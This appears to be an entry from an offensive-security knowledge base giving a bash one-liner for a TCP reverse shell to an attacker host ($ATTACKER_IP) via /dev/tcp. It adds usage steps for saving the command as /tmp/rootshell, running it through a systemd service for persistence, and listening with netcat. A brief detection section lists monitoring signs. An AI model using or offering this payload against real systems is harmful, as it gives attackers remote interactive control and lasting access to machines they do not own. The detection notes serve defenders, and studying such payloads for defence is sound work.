---
id: c7a07d68-988f-485d-9a82-2d51e76beca1
type: code
language: bash
verified: true
created_at: '2019-10-16T23:21:22.655739+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
  - persistence
validated: true
---

# Bash-TCP-Reverse-Shell

## Code

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'
```

## Description

This bash one-liner creates an interactive TCP reverse shell that connects from the target back to the attacker's listening host, providing a full shell session. It uses /dev/tcp for the connection, which is built into bash on most Linux systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | IP address of the attacker's listener | 192.168.1.100 |
| $ATTACKER_PORT | Port on which the attacker is listening (e.g., with netcat) | 4444 |

## Usage

Save the substituted code to a file like /tmp/rootshell, make it executable ('chmod +x /tmp/rootshell'), and execute it directly or via a systemd service for persistence. On the attacker side, listen with 'nc -lvnp $ATTACKER_PORT'. Ideal for post-exploitation in privilege escalation or persistence scenarios where bash is available.

## Detection

- Process monitoring: Look for bash processes with /dev/tcp in arguments (e.g., via ps aux | grep tcp).
- Network logs: Outbound TCP connections from root or unexpected users to non-standard ports.
- Syslog/auditd: Events for bash execution with network redirection.
- EDR tools flagging interactive shells or anomalous network from init processes.

## Related

- [[procedures/Create-Systemd-Service-for-Persistence]]
- [[tools/Netcat]]
